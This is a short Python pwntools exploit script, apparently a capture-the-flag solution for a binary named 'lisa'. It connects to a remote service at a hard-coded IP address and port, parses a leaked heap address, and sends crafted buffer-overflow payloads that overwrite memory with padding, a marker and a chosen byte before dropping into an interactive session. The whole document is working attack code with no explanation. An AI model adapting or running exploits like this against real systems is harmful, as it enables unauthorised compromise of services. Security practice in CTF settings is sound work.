from pwn import *

context(arch='i386', os='linux')
# p = process('./lisa')
p = remote('18.191.244.121', 12345)

p.recvuntil('share: ')
leak = p.recvuntil('\n').strip()
leak = int(leak, 16)
heap_base = leak & 0xfffffff0

payload = ''
payload += p32(0)
payload += p32(leak)
payload += p32(1)
p.sendline(payload)

payload = ''
payload += 'a' * 24
payload += 'cccc'
payload += '\x15'
payload = payload.ljust(0x2b, '\x00')

p.send(payload)
p.send('\x00')

s = p.recv()
print s
p.interactive()
